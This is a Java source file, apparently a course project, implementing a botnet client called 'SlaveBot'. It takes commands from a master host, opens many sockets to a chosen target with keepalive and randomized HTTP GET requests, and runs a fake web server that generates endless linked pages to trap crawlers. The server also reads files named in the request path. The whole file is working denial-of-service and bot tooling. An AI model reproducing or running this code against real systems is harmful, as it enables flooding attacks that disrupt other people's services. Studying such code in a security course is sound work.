import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.math.BigInteger;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Scanner;

public class SlaveBot {
	
	static List<Socket> slaves = new ArrayList<Socket>();
	static List<String> slavesString = new ArrayList<String>();
	static String slaveSelected, targetIp, targetPort, numberOfConnetions, url, nextFileName;
	static boolean keepAlive, upFakeUrl;
	public static ArrayList<Socket> connected = new ArrayList<>();
	static ServerSocket serverSocketForFakeUrl;
	static int nextFileNumber;
	static Socket connectMe;
	
	public static void main(String [] args) throws IOException, NoSuchAlgorithmException {
		Socket slave = null;
		Scanner sc;
		if(args.length == 4 && args[0].equals("-h") && args[2].equals("-p")){
			try {
				slave = new Socket(args[1],Integer.parseInt(args[3]));
				//System.out.println("Connected to " + slave.getRemoteSocketAddress());
			} catch (NumberFormatException | IOException e) {
				//System.out.println("Failed to create socket");
				e.printStackTrace();
			}
			String inputStringCLI;
			while (true){
				sc = new Scanner(slave.getInputStream());
				inputStringCLI = sc.nextLine();
				if (inputStringCLI.equals("")) {
					continue;
				} else if (inputStringCLI.startsWith("connect "))	{
					String[] splittedCommand = inputStringCLI.split("\\s+");
					if(splittedCommand.length == 4) {
						slaveSelected = splittedCommand[1];
						targetIp = splittedCommand[2];
						targetPort = splittedCommand[3];
						numberOfConnetions = "1";
						keepAlive = false;
						callCreateSocket(slaves, slaveSelected, targetIp, targetPort, numberOfConnetions, false, "");
					} else if(splittedCommand.length == 5) {
						slaveSelected = splittedCommand[1];
						targetIp = splittedCommand[2];
						targetPort = splittedCommand[3];
						numberOfConnetions = "1";
						keepAlive = false;
						url = "";
						if(splittedCommand[4].toLowerCase().contains("keepalive")){
							keepAlive = true;
						}
						if(splittedCommand[4].contains("url")) {
							url = splittedCommand[4];
						}
						if(splittedCommand[4].matches("[0-9]+") && splittedCommand[4].length() >= 1) {
							numberOfConnetions = splittedCommand[4];
						}
						callCreateSocket(slaves, slaveSelected, targetIp, targetPort, numberOfConnetions, keepAlive, url);
					} else if(splittedCommand.length == 6) {
						slaveSelected = splittedCommand[1];
						targetIp = splittedCommand[2];
						targetPort = splittedCommand[3];
						numberOfConnetions = "1";
						keepAlive = false;
						url = "";
						if(splittedCommand[4].toLowerCase().contains("keepalive") || splittedCommand[5].toLowerCase().contains("keepalive")) {
							keepAlive = true;
						}
						if(splittedCommand[4].contains("url")) {
							url = splittedCommand[4];
						}
						if(splittedCommand[5].contains("url")) {
							url = splittedCommand[5];
						}
						if(splittedCommand[4].matches("[0-9]+") && splittedCommand[4].length() >= 1) {
							numberOfConnetions = splittedCommand[4];
						}
						if(splittedCommand[5].matches("[0-9]+") && splittedCommand[5].length() >= 1) {
							numberOfConnetions = splittedCommand[5];
						}
						callCreateSocket(slaves, slaveSelected, targetIp, targetPort, numberOfConnetions, keepAlive, url);
					} else if(splittedCommand.length == 7) {
						slaveSelected = splittedCommand[1];
						targetIp = splittedCommand[2];
						targetPort = splittedCommand[3];
						keepAlive = false;
						numberOfConnetions = splittedCommand[4];
						url = "";
						if(splittedCommand[5].toLowerCase().contains("keepalive")) {
							keepAlive = true;
						} else if(splittedCommand[6].toLowerCase().contains("keepalive")) {
							keepAlive = true;
						} 
						if(splittedCommand[6].contains("url")) {
							url = splittedCommand[6];
						} else if(splittedCommand[5].contains("url")) {
							url = splittedCommand[5];
						}
						callCreateSocket(slaves, slaveSelected, targetIp, targetPort, numberOfConnetions, keepAlive, url);
					} else {
						System.out.println("Invalid command! Provide correct command and it's arguments.");
					}
				} else if (inputStringCLI.startsWith("disconnect "))	{	 
					String[] arrayOfString = inputStringCLI.split("\\s+");
					if(arrayOfString.length == 3) {
						slaveSelected = arrayOfString[1];
						targetIp = arrayOfString[2];
						targetPort = "0";
						 if(slaveSelected.equalsIgnoreCase("all")){
							 for(int k=0; k<slaves.size();k++) {
								 disconnect(Integer.parseInt(targetPort),targetIp);
						 	}
						} else 	{
							disconnect(Integer.parseInt(targetPort),targetIp);
						}
					}
					else if(arrayOfString.length == 4) {
						slaveSelected = arrayOfString[1];
						targetIp = arrayOfString[2];
						targetPort = arrayOfString[3];
						 if(slaveSelected.equalsIgnoreCase("all")){
							 for(int k=0; k<slaves.size();k++) {
								 disconnect(Integer.parseInt(targetPort),targetIp);
						 	}
						} else 	{
							disconnect(Integer.parseInt(targetPort),targetIp);
						}			
					} else {
						System.out.println("Invalid command! Provide correct command and it's arguments.");
					}
				} else if(inputStringCLI.startsWith("raiseFakeUrl")){
					String[] splittedCommand = inputStringCLI.split(" ");
					serverSocketForFakeUrl = new ServerSocket(Integer.parseInt(splittedCommand[2]));
					Thread fakeUrlThread = new Thread(new SocketFakeClientAccept(serverSocketForFakeUrl, splittedCommand[1]), "fakeBotsThread");
					fakeUrlThread.start();
				} else if(inputStringCLI.startsWith("downFakeUrl")){
					serverSocketForFakeUrl.close();
				} else {
					System.out.println(inputStringCLI);
				}
			}
		} else {
			System.out.println("Invalid command! Provide correct command and it's arguments.");
		}
	}
	private static void callCreateSocket(List<Socket> slaves, String slaveSelected, String targetIp, String targetPort, String numberOfConnetions, boolean keepAlive, String url) throws IOException {
		if(slaveSelected.equalsIgnoreCase("all"))	{
			for(int k=0; k<slaves.size();k++)	{
				for(int j = 0; j < Integer.parseInt(numberOfConnetions);j++) {
					createSocket(slaves.get(k),Integer.parseInt(targetPort),targetIp,Integer.parseInt(numberOfConnetions), keepAlive,url);
				}
			}
		} else {
			for(int j =0; j< slaves.size();j++) {
				if(slaveSelected.equalsIgnoreCase(slaves.get(j).getInetAddress().getHostName().toString())) {
					for(int k = 0; k < Integer.parseInt(numberOfConnetions);k++) {
						createSocket(slaves.get(j),Integer.parseInt(targetPort),targetIp,Integer.parseInt(numberOfConnetions), keepAlive,url);
					}
				}
			}
		}
	}
	
	@SuppressWarnings("deprecation")
	public static void createSocket(Socket newConnect, int targetPort, String target, int numberOfConnetions, boolean keepAlive, String url) throws IOException {
		try {
			connectMe = new Socket(target, targetPort);
			if(keepAlive==true) {
				connectMe.setKeepAlive(true);
	            PrintStream p = new PrintStream(newConnect.getOutputStream());
				p.println("Socket created with keepalive enabled");
				p.flush();
			}
			if(url.length() != 0)
	        {	            
	            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(connectMe.getOutputStream(), "UTF8"));
	            url = url.substring(4, url.length());
	            url = url + getRandString();
				writer.write("GET "+url +"\r\n");
				writer.write("\r\n");
				writer.flush();
				BufferedReader reader = new BufferedReader(new InputStreamReader(connectMe.getInputStream()));
				String responseLine;
				if((responseLine = reader.readLine()) != null)
				{
		            PrintStream p = new PrintStream(newConnect.getOutputStream());
					p.println(responseLine+ " random string used "+url);
					p.flush();
				}	            
	            
	        }
			connected.add(connectMe);
		}catch(IOException e) {
			e.printStackTrace();
			System.exit(-1);
		}
	}
	public static void disconnect(int tarport, String TarAdd) {
		try {		
			if(tarport == 0) {
				for(int i = 0; i < connected.size(); i++) {
					if(!connected.get(i).isClosed()) {
							connected.get(i).close();
					}
				}
			} else {
					for(int i = 0; i < connected.size(); i++) {
						if(connected.get(i).getPort() == tarport) {
							if(!connected.get(i).isClosed()) {
								connected.get(i).close();
							}
						}
					}
				}
		} catch(IOException e) {
			e.printStackTrace();
		}
	}
	public static String getRandString() {
	    String RANDCHARS = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
	    StringBuilder rand = new StringBuilder();
	    Random rnd = new Random();
	    while (rand.length() < 10) {
	        int index = (int) (rnd.nextFloat() * RANDCHARS.length());
	        rand.append(RANDCHARS.charAt(index));
	    }
	    String randStr = rand.toString();
	    return randStr;
	}
}

class SocketFakeClientAccept implements Runnable {
	ServerSocket serverSocketForFakeUrl;
	Socket socketForFakeUrl;
	String nextFileLeft, nextFileRight, fakeURl;
	SocketFakeClientAccept(ServerSocket serverSocket, String splittedCommand) {
		serverSocketForFakeUrl = serverSocket;
		fakeURl = splittedCommand;
	}
	public void run() {
		while (true) {
			try {
				//socketForFakeUrl = new Socket("localhost", Integer.parseInt(splittedCommand[2]));
				socketForFakeUrl = serverSocketForFakeUrl.accept();
				socketForFakeUrl.setKeepAlive(true);
				InputStream is = socketForFakeUrl.getInputStream();
				BufferedReader in = new BufferedReader(new InputStreamReader(is)); 
				String line = in.readLine();
				if(line!="" && line!=null && (line.contains(".html") || line.contains(" / "))) {
					String key="CMPE206_project3_maulik.bhatt_012421019";
			        MessageDigest messageDigest = MessageDigest.getInstance("MD5");
			        messageDigest.update(key.getBytes(),0,key.length());
			        String md5String = new BigInteger(1,messageDigest.digest()).toString(16);
					String lines = "";
					if(line.contains(".html")) {
						int inputNumber = 0;
						if(line.split(" ")[1].matches(".*\\d+.*")) {
							inputNumber = Integer.parseInt(line.split(" ")[1].replaceAll("[^\\d]", ""));
						}
						if(inputNumber==0) {
							nextFileLeft = "index1.html";
							nextFileRight = "index2.html";				
						} else {
							nextFileLeft = "index"+Integer.toString(inputNumber+1)+".html";
							nextFileRight = "index"+Integer.toString(inputNumber+2)+".html";
						}
						lines = "<!DOCTYPE html><html><head><title>Page Title</title></head><body><h1>My Bot</h1><a href=nextFileLeft>Check this out!</a><br><a href=nextFileRight>Check this out!</a><br><h1>Breaking News:(md5 string :- md5String)</h1><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br></body></html>";								
					} else {
						nextFileLeft = "";
						nextFileRight = "";
						lines = "<!DOCTYPE html><html><head><title>Page Title</title></head><body><h1>My Bot</h1><a href=\"index1.html\">Check this out!</a><br><a href=\"index2.html\">Check this out!</a><br><h1>Breaking News:(md5 string :- md5String)</h1><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br><a href=\"provideUrl\" target=\"_blank\">Check this out!</a><br></body></html>";
					}
					PrintWriter out = new PrintWriter(socketForFakeUrl.getOutputStream());
					out.println("HTTP/1.1 200 OK");
					out.println("Content-Type: Text/html");
					out.println("\r\n");
					String temp = "http://"+fakeURl;
					out.println(lines.replace("md5String",md5String).replace("provideUrl",temp).replace("nextFileLeft", nextFileLeft).replace("nextFileRight", nextFileRight));
					out.flush();
					out.close();
				} else if(line!="" && line!=null && (line.contains("sitemap.xml") || line.contains("robots.txt"))) {
					List<String> lines = Files.readAllLines( Paths.get(line.split(" ")[1].replace("/", "")));
					PrintWriter out = new PrintWriter(socketForFakeUrl.getOutputStream());
					out.println("HTTP/1.1 200 OK");
					out.println("Content-Type: Text/html");
					out.println("\r\n");
					for(int k=0; k<lines.size();k++) {
						out.println(lines.get(k));
					}
					out.flush();
					out.close();
				}
			} catch (IOException | NoSuchAlgorithmException e) {
				break;
			}
		}
	}
}